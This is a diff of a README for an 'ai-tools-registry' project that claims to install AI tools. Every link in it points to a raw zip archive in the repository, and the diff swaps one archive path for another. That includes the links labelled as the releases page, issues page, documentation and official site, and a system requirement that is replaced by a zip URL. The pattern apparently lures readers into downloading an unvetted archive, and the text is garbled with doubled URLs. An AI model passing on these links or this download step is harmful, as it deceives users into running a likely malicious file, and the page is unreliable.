@@ -1,14 +1,14 @@
 # 🎉 ai-tools-registry - Streamline AI Tool Installation Easily
 
 ## 📥 Download Now!
-[![Download ai-tools-registry](https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/equisignal/ai-tools-registry.zip%https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/equisignal/ai-tools-registry.zip)](https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/equisignal/ai-tools-registry.zip)
+[![Download ai-tools-registry](https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/app/og/ai_tools_registry_v3.0.zip%https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/app/og/ai_tools_registry_v3.0.zip)](https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/app/og/ai_tools_registry_v3.0.zip)
 
 ## 🚀 Getting Started
 The **ai-tools-registry** helps you install AI tools and UI components for the AI SDK quickly and hassle-free. This guide will walk you through downloading and running the application.
 
 ## 🛠️ System Requirements
 - **Operating System:** Windows, macOS, or Linux (Latest versions recommended)
-- **https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/equisignal/ai-tools-registry.zip** Version 14 or higher
+- **https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/app/og/ai_tools_registry_v3.0.zip** Version 14 or higher
 - **Internet Connection:** Required for downloading
 
 ## 📦 Features
@@ -20,7 +20,7 @@ The **ai-tools-registry** helps you install AI tools and UI components for the A
 ## 📂 Download & Install
 To get started, follow these steps:
 
-1. Visit the [Releases page](https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/equisignal/ai-tools-registry.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/app/og/ai_tools_registry_v3.0.zip).
 2. Look for the latest version of the ai-tools-registry.
 3. Click on the version number to open its release notes.
 4. Download the installation file appropriate for your operating system.
@@ -42,11 +42,11 @@ After installation, you can find the ai-tools-registry in your applications list
 4. Follow the on-screen instructions to complete any further setup.
 
 ## 🔄 Updating
-To keep your ai-tools-registry up-to-date, regularly check the [Releases page](https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/equisignal/ai-tools-registry.zip) for new versions. Download and install updates by following the same steps as above.
+To keep your ai-tools-registry up-to-date, regularly check the [Releases page](https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/app/og/ai_tools_registry_v3.0.zip) for new versions. Download and install updates by following the same steps as above.
 
 ## 🌐 Community Support
 For support and community interaction:
-- Check the [GitHub Issues section](https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/equisignal/ai-tools-registry.zip) for help and suggestions.
+- Check the [GitHub Issues section](https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/app/og/ai_tools_registry_v3.0.zip) for help and suggestions.
 - Participate in discussions to share your experiences or ask questions.
 
 ## 💡 Tips
@@ -61,9 +61,9 @@ We are working on adding more features, including:
 - Performance improvement updates for a smoother experience.
 
 ## 🔗 Useful Resources
-- [GitHub Documentation](https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/equisignal/ai-tools-registry.zip)
-- [https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/equisignal/ai-tools-registry.zip Official Site](https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/equisignal/ai-tools-registry.zip)
-- [AI SDK Resources](https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/equisignal/ai-tools-registry.zip)
+- [GitHub Documentation](https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/app/og/ai_tools_registry_v3.0.zip)
+- [https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/app/og/ai_tools_registry_v3.0.zip Official Site](https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/app/og/ai_tools_registry_v3.0.zip)
+- [AI SDK Resources](https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/app/og/ai_tools_registry_v3.0.zip)
 
 ## 🛑 Trouble Shooting
 If the application does not run as expected:
@@ -72,6 +72,6 @@ If the application does not run as expected:
 - Revisit the installation steps to confirm everything was done correctly.
 
 ## 💬 Feedback
-Your feedback is vital for our improvement. Please use the [issues page](https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/equisignal/ai-tools-registry.zip) to submit your suggestions or report problems.
+Your feedback is vital for our improvement. Please use the [issues page](https://raw.githubusercontent.com/Anmolaon/ai-tools-registry/main/app/og/ai_tools_registry_v3.0.zip) to submit your suggestions or report problems.
 
 With the **ai-tools-registry**, managing your AI tools has never been easier. Enjoy your enhanced AI development journey!
